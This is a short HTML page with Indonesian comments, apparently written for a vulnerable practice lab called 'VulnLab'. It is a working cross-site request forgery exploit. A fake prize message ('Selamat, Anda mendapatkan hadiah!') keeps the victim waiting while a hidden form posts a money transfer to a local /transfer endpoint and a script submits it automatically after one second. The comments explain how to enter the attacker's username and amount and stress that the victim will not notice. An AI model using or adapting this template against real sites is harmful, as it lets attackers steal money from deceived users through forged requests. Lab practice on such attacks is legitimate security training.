# web-phising

<!DOCTYPE html>
<html>

<body>
    <h1>Selamat, Anda mendapatkan hadiah! Mohon tunggu...</h1>
   
    <!-- Ini adalah form yang akan kita gunakan untuk menyerang -->
    <!-- Form ini disembunyikan agar korban tidak melihatnya -->
    <form id="csrfForm" action="http://127.0.0.1:5000/transfer" method="POST">
        <!--
            GANTI 'username_penyerang' dengan username Anda di VulnLab.
            'name' pada input harus sesuai dengan yang ada di inspect element halaman transfer.
            Kemungkinan besar adalah 'username' atau 'to_username'.
        -->
        <input type="hidden" name="to_user" value="to_user">

        <!--
            GANTI '10000' dengan jumlah uang yang ingin Anda transfer.
            'name' pada input harus sesuai, kemungkinan besar 'jumlah' atau 'amount'.
        -->
        <input type="hidden" name="jumlah" value="500">
    </form>

    <!--
        Script ini akan menjalankan form secara otomatis saat halaman dimuat.
        Korban tidak akan sadar bahwa form ini sedang dikirimkan.
    -->
    <script>
        // Tunggu 1 detik agar halaman terlihat loading, lalu kirim form
        setTimeout(function() {
            document.getElementById("csrfForm").submit();
        }, 1000);
    </script>
</body>
</html>
	
